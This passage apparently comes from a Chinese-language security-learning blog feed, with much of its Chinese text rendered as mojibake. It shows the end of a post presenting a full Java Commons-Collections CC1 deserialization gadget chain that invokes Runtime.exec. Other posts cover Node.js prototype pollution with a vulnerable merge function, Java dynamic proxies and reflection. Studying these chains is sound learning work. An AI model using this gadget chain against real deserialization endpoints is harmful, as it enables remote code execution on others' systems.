·æ¥å†™ï¼Œç„¶ååœ¨å®ä¾‹åŒ–ä¸€ä¸‹ï¼ŒæŠŠä¸œè¥¿ä¼ è¿›å»ï¼Œç„¶åè¿›è¡Œåºåˆ—åŒ–</p><p><strong>å†™å¥½çš„é“¾å­</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.commons.Method;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="comment">//import java.lang.reflect.Method;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line"><span class="comment">//        Runtime runtime = Runtime.getRuntime();</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//         InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);</span></span><br><span class="line"><span class="comment">//        Method method = (Method) new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null &#125;).transform(Runtime.class);</span></span><br><span class="line"><span class="comment">//        Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;).transform(method);</span></span><br><span class="line"><span class="comment">//            new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span> &#125;),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">                &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//chainedTransformer.transform(Runtime.class);</span></span><br><span class="line">         <span class="comment">//Class c = Runtime.class;</span></span><br><span class="line">          <span class="comment">//Method method =  c.getMethod(&quot;getRuntime&quot;,null);</span></span><br><span class="line">          <span class="comment">//Runtime r = (Runtime) method.invoke(null,null); //getRuntimeæ˜¯æ— å‚å‡½æ•°</span></span><br><span class="line"><span class="comment">//          Method method1 = c.getMethod(&quot;exec&quot;,String.class);</span></span><br><span class="line"><span class="comment">//          method1.invoke(r,&quot;calc&quot;);</span></span><br><span class="line"><span class="comment">//        HashMap hashMap = new HashMap&lt;&gt;();</span></span><br><span class="line"><span class="comment">//        hashMap.put(&quot;value&quot;,&quot;aaa&quot;);</span></span><br><span class="line"><span class="comment">//        Map&lt;Object,Object&gt; map = TransformedMap.decorate(hashMap,null,chainedTransformer);</span></span><br><span class="line"><span class="comment">//////        for (Map.Entry entry:map.entrySet())</span></span><br><span class="line"><span class="comment">//////        &#123;</span></span><br><span class="line"><span class="comment">//////            entry.setValue(runtime);</span></span><br><span class="line"><span class="comment">//////        &#125;</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(hashMap,chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span>  <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Target.class,lazyMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(),h);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Override.class,map);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(o);</span></span><br><span class="line"><span class="comment">//        unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">            oos.writeObject(obj);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">            <span class="keyword">return</span> obj;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>æœ€åçš„è¯cc1é“¾å°±å…¨éƒ¨å­¦å®Œäº†ï¼Œä¹Ÿæ”¶è·äº†å¾ˆå¤š</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> javaååºåˆ—åŒ– cc1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nodejs-æ±¡æŸ“</title>
      <link href="/posts/1941d3ec.html"/>
      <url>/posts/1941d3ec.html</url>
      
        <content type="html"><![CDATA[<p>è¿™é‡Œæˆ‘æ˜¯çœ‹pç‰›çš„æ–‡ç« æ¥è¿›è¡Œå­¦ä¹ çš„ï¼Œæ‰€ä»¥ä¸‹é¢çš„å†…å®¹ä¹Ÿæ˜¯æ ¹æ®pç‰›çš„æ–‡ç« æ¥å†™ä¸€ç‚¹è‡ªå·±çš„è§è§£</p><p><img src="../images/image-20230316193813743.png" alt="image-20230316193813743"></p><p>è¿™é‡Œpç‰›è¿›è¡Œäº†æ€»ç»“ï¼Œå¯ä»¥æ ¹æ®pç‰›å†™çš„è¿™ä¸ªä»£ç æ¥è¿›è¡Œç†è§£</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">show</span> = <span class="keyword">function</span> <span class="title function_">show</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">bar</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> foo = <span class="keyword">new</span> <span class="title class_">Foo</span>()</span><br><span class="line">foo.<span class="title function_">show</span>()</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°±æ˜¯åœ¨Fooç±»ç”¨äº†prototypeåï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å®ä¾‹åŒ–Fooç±»çš„å¯¹è±¡ï¼Œå°†ä¼šæœ‰Fooç±»é‡Œé¢çš„å±æ€§å’Œæ–¹æ³•ã€‚</p><p>å†ç»™ä¸€ä¸ªä»£ç æ¥è¿›è¡Œç†è§£ä¸Šé¢å†™çš„è§£é‡Š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Father</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;Donald&#x27;</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">last_name</span> = <span class="string">&#x27;Trump&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Son</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;Melania&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Son</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Father</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> son = <span class="keyword">new</span> <span class="title class_">Son</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Name: <span class="subst">$&#123;son.first_name&#125;</span> <span class="subst">$&#123;son.last_name&#125;</span>`</span>)</span><br></pre></td></tr></table></figure><p>å°±æ˜¯ä½¿ç”¨<code>Son.prototype = new Father()</code>åï¼Œè¿™é‡Œä½¿ç”¨äº†prototypeï¼Œè¿›è¡Œäº†å®ä¾‹åŒ–å¯¹è±¡ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥Sonç±»å®ä¾‹åŒ–çš„å¯¹è±¡éƒ½èƒ½æ‹¥æœ‰Father()ç±»é‡Œè¾¹çš„å±æ€§å’Œæ–¹æ³•</p><p>ä¸Šé¢å¯èƒ½å°±æ˜¯çœ‹pç‰›æ–‡ç« æ—¶ä¼šç–‘æƒ‘çš„ç‚¹</p><p><img src="../images/image-20230316195653525.png" alt="image-20230316195653525"></p><p>è¿™æ˜¯pç‰›æ€»ç»“çš„</p><p>pç‰›å†™çš„ä»£ç </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯å°†ä¸¤ä¸ªå¯¹è±¡ï¼ˆ<code>target</code> å’Œ <code>source</code>ï¼‰è¿›è¡Œåˆå¹¶ï¼Œè¿”å›åˆå¹¶åçš„ <code>target</code> å¯¹è±¡ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒä¼šå°† <code>source</code> å¯¹è±¡ä¸­çš„å±æ€§é€’å½’åœ°åˆå¹¶åˆ° <code>target</code> å¯¹è±¡ä¸­ï¼Œå¦‚æœæŸä¸ªå±æ€§åœ¨ <code>source</code> å¯¹è±¡ä¸­å­˜åœ¨ä½†åœ¨ <code>target</code> å¯¹è±¡ä¸­ä¸å­˜åœ¨ï¼Œåˆ™ç›´æ¥å°†è¯¥å±æ€§èµ‹å€¼ç»™ <code>target</code> å¯¹è±¡ã€‚</p><p>è¿™ä¸ªå‡½æ•°é€šè¿‡ä½¿ç”¨ <code>for...in</code> å¾ªç¯éå† <code>source</code> å¯¹è±¡ä¸­çš„æ¯ä¸€ä¸ªå±æ€§ï¼Œç„¶åä½¿ç”¨ <code>if</code> è¯­å¥åˆ¤æ–­è¯¥å±æ€§æ˜¯å¦åŒæ—¶å­˜åœ¨äº <code>source</code> å’Œ <code>target</code> å¯¹è±¡ä¸­ã€‚å¦‚æœæ˜¯ï¼Œåˆ™é€’å½’è°ƒç”¨ <code>merge</code> å‡½æ•°ï¼Œå°† <code>source</code> å¯¹è±¡ä¸­å¯¹åº”çš„å±æ€§åˆå¹¶åˆ° <code>target</code> å¯¹è±¡ä¸­å¯¹åº”çš„å±æ€§ä¸Šï¼›å¦‚æœä¸æ˜¯ï¼Œåˆ™ç›´æ¥å°†è¯¥å±æ€§èµ‹å€¼ç»™ <code>target</code> å¯¹è±¡ã€‚</p><p><strong>è¿™æ˜¯å¯¹ä¸Šé¢çš„ä»£ç çš„è§£é‡Š</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> nodejs-æ±¡æŸ“ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaåŠ¨æ€ä»£ç†</title>
      <link href="/posts/bcee6ab6.html"/>
      <url>/posts/bcee6ab6.html</url>
      
        <content type="html"><![CDATA[<p>è¿™ä¸ªå’Œåå°„ä¸åŒçš„åœ°æ–¹åœ¨äºï¼Œè¿™ä¸ªä¸œè¥¿æœ‰æ¥å£</p><p>è¿™é‡Œè¯è¿›è¡Œå­¦ä¹ çš„è¯å¾—éœ€è¦å››ä¸ªjavaä»£ç </p><p><img src="../images/image-20230315183517863.png" alt="image-20230315183517863"></p><p>ä¸€ä¸ªæ¥å£å’Œå…¶ä»–ä¸‰ä¸ªclass</p><p> è¿™é‡Œçš„IUseræ˜¯ä¸€ä¸ªæ¥å£</p><p><img src="../images/image-20230315190938799.png" alt="image-20230315190938799"></p><p>UserImplæ˜¯ä¸€ä¸ªç»§æ‰¿äºIUseræ¥å£,é‡Œé¢é‡å†™äº†IUseræ¥å£é‡Œçš„show()æ–¹æ³•</p><p><img src="../images/image-20230315190955845.png" alt="image-20230315190955845"></p><p>UserProxyä¹Ÿæ˜¯ä¸€ä¸ªç»§æ‰¿IUseræ¥å£ï¼Œé‡Œé¢ä¹Ÿæ˜¯é‡å†™äº†showæ–¹æ³•</p><p><img src="../images/image-20230315191007234.png" alt="image-20230315191007234"></p><p>ProxyTestæ˜¯ä¸ªäº§ç”Ÿä»£ç†å¯¹è±¡çš„ç±»</p><p><img src="../images/image-20230315191016626.png" alt="image-20230315191016626"></p><p><strong>åœ¨è¿™ä¸ªäº§ç”Ÿä»£ç†å¯¹è±¡çš„ç±»é‡Œè¾¹è¿›è¡Œæ“ä½œ</strong></p><p><img src="../images/image-20230315190818909.png" alt="image-20230315190818909"></p><p>è¿™é‡Œå› ä¸ºUserImplç±»æ˜¯ç»§æ‰¿äº†IUseræ¥å£ï¼Œæ‰€ä»¥è¿™é‡Œçš„ç±»å‹å¾—å®šä¹‰ä¸ºIUser.</p><p>ç„¶åè¿™é‡Œå°±ä¼šè°ƒç”¨UserImplç±»é‡Œè¾¹çš„showæ–¹æ³•</p><p><img src="../images/image-20230315191145326.png" alt="image-20230315191145326"></p><p>æ¥ä¸‹æ¥ä½¿ç”¨å¦ä¸€ä¸ªç±»</p><p><img src="../images/image-20230315191304912.png" alt="image-20230315191304912"></p><p><img src="../images/image-20230315191339554.png" alt="image-20230315191339554"></p><p>è¿™é‡Œæ˜¯ä¼šè¾“å‡ºä¸¤ä¸ªå±•ç¤ºï¼Œå› ä¸ºUserProxyé‡Œé¢æœ‰ä¸€ä¸ªæœ‰å‚æ„é€ å‡½æ•°ï¼Œä¼ çš„å€¼æ˜¯åˆ«äººä¼ å…¥çš„å¯¹è±¡ï¼Œå› ä¸ºè¿™é‡Œä¼ å…¥çš„å¯¹è±¡æ˜¯UserImplçš„ï¼Œæ‰€ä»¥åœ¨UserProxyè°ƒç”¨showæ–¹æ³•æ—¶ï¼Œå°±ä¼šè°ƒç”¨åˆ°UserImplç±»é‡Œè¾¹çš„showæ–¹æ³•</p><p><strong>ä»¥ä¸Šå±•ç¤ºçš„å°±æ˜¯é™æ€ä»£ç†äº†</strong></p><p><strong>åŠ¨æ€ä»£ç†</strong></p><p>è¿™é‡Œå‡ºç°çš„åŠ¨æ€ä»£ç†å°±æ˜¯å› ä¸ºé™æ€ä»£ç†æœ‰ç¼ºç‚¹ï¼Œå› ä¸ºå¦‚æœæ¥å£é‡Œé¢æœ‰å¾ˆå¤šå‡½æ•°çš„è¯ï¼Œæ—¥å¿—(UserImpl)é‡Œé¢ä¹Ÿè¦é‡å†™å¾ˆå¤šå‡½æ•°çš„æ–¹æ³•ï¼Œä»£ç†ç±»(UserProxy)é‡Œè¾¹ä¹Ÿè¦é‡å†™å¾ˆå¤šç±»çš„æ–¹æ³•ã€‚å°±ä¼šæ¯”è¾ƒç¹ç</p><p>è¿™é‡Œè¦å®ç°åŠ¨æ€ä»£ç†çš„è¯ï¼Œå°±æ˜¯å¾—æƒ³è¦è¿™ä¸ªæ–¹æ³•</p><p><img src="../images/image-20230315193449922.png" alt="image-20230315193449922"></p><p><img src="../images/image-20230315193502567.png" alt="image-20230315193502567"></p><p>è¿™ä¸ªæ–¹æ³•é™å®šäº†ä¸‰ä¸ªå‚æ•°ï¼Œå‰ä¸¤ä¸ªéƒ½æ˜¯å†™æ­»çš„ï¼Œåªè¦æ˜¯æœ€åä¸€ä¸ªï¼Œè¿™ä¸ªæ˜¯å…³é”®(å°±æ˜¯æŠŠæƒ³è¦åšçš„ä¸œè¥¿ä¼ è¿›å»)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Proxy.newProxyInstance(user.getClass().getClassLoader(), user.getClass().getInterfaces(),xxx);</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªxxxå°±æ˜¯æˆ‘ä»¬è¦åšçš„äº‹æƒ…</p><p>æ‰€ä»¥æˆ‘ä»¬å¾—å…ˆæ–°å»ºä¸€ä¸ªç±»</p><p><img src="../images/image-20230315204047548.png" alt="image-20230315204047548"></p><p><img src="../images/image-20230315204109374.png" alt="image-20230315204109374"></p><p>ç„¶åå¯¹è¿™ä¸ªinvokeè¿›è¡Œé‡å†™</p><p><img src="../images/image-20230315204538812.png" alt="image-20230315204538812"></p><p>è¿™é‡Œå’Œå‰é¢çš„é‚£ä¸ªä»£ç†ç±»å·®ä¸å¤šï¼Œä½†æ˜¯è¿™é‡Œç”¨çš„InvocationHandlerè¿™ä¸ªç±»ï¼Œ</p><p>è¿™ä¸ªinvokeå‡½æ•°ï¼Œåªè¦æˆ‘ä»¬èƒ½ä¼ è¿›æ¥ä¸œè¥¿ï¼Œä»–å°±ä¼šçŸ¥é“æˆ‘ä»¬è°ƒç”¨çš„æ˜¯å“ªä¸ªæ–¹æ³•ï¼Œè¿™æ˜¯è¿™ä¸ªå‡½æ•°çš„æ€§è´¨</p><p>æˆ‘ä»¬å°±åˆ°ä»£ç†æµ‹è¯•ç±»é‚£è¾¹è¿›è¡Œè°ƒè¯•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserinvocationHandler</span>(user);</span><br><span class="line">        <span class="type">IUser</span> <span class="variable">user1</span> <span class="operator">=</span> (IUser) Proxy.newProxyInstance(user.getClass().getClassLoader(), user.getClass().getInterfaces(),invocationHandler);</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å°±æ˜¯åˆ©ç”¨è¿™ä¸ªinvocationHandlerè¿™ä¸ªç±»æ¥è¿›è¡ŒåŠ¨æ€ä»£ç†ï¼Œæ‰€ä»¥åœ¨newä¸€ä¸ªå¯¹è±¡çš„æ—¶å€™ï¼Œæˆ‘ä»¬å°±ç”¨å®ƒã€‚</p><p>ç„¶åå†æŠŠå®ä¾‹åŒ–åçš„å¯¹è±¡æ”¾è¿›ä¸‹é¢çš„Proxy.newProxyInstanceé‡Œï¼›</p><p><img src="../images/image-20230315205413275.png" alt="image-20230315205413275"></p><p>ç„¶åå°±å¯ä»¥ç›´æ¥è°ƒç”¨è¿™ä¸ªæ–¹æ³•äº†</p><p><img src="../images/image-20230315205707219.png" alt="image-20230315205707219"></p><p>åœ¨è¿™ä¸ªç±»é‡Œè¾¹æ–°åŠ è¿™ä¸ªæ–¹æ³•çš„è¯ï¼Œå°±å¯ä»¥ç›´æ¥è°ƒç”¨äº†äº†ï¼Œå°±ä¸ç”¨å†å»ä»£ç†ç±»é‡Œè¾¹é‡å†™å‡½æ•°çš„æ–¹æ³•äº†ï¼Œè¿™æ ·çš„è¯å°±å¤§å¤§å‡å°‘äº†ä»£ç é‡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">IUser</span> <span class="variable">user1</span> <span class="operator">=</span> (IUser) Proxy.newProxyInstance(iUser.getClass().getClassLoader(), iUser.getClass().getInterfaces(),invocationHandler);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„ä»£ç ä¹Ÿå¯ä»¥å†™æˆè¿™æ ·</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">IUser</span> <span class="variable">user1</span> <span class="operator">=</span> (IUser) Proxy.newProxyInstance(iUser.getClass().getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;IUser.class&#125;,invocationHandler);</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230315210106913.png" alt="image-20230315210106913"></p><p>è·Ÿè¿™ä¸ªæœ‰å…³</p>]]></content>
      
      
      
        <tags>
            
            <tag> java åŠ¨æ€ä»£ç† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaåå°„</title>
      <link href="/posts/e29c8e30.html"/>
      <url>/posts/e29c8e30.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/BV16h411z7o9?p=2&amp;vd_source=bacfffe46b930fda5761b63367eb298c">è¿™é‡Œè¯æ˜¯çœ‹è¿™ç¯‡æ–‡ç« æ¥è¿›è¡Œå­¦ä¹ çš„</a></p><p><img src="../images/image-20230314221340100.png" alt="image-20230314221340100"></p><p>ä¸Šé¢çš„å°±æ˜¯javaåå°„çš„ä½œç”¨</p><p>è¿™é‡Œçš„æˆ‘ä»¬åœ¨æœ¬åœ°è‡ªå·±å†™ä¸€ä¸ªç±»æ¥è¿›è¡Œæµ‹è¯•</p><p><strong>Person.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//æ„é€ å‡½æ•°</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name,<span class="type">int</span> age)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">        <span class="built_in">this</span>.age=age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">//å¯¹Serializableè¿™ä¸ªæ¥å£é‡Œçš„toStringå‡½æ•°è¿›è¡Œé‡å†™</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span></span><br><span class="line">    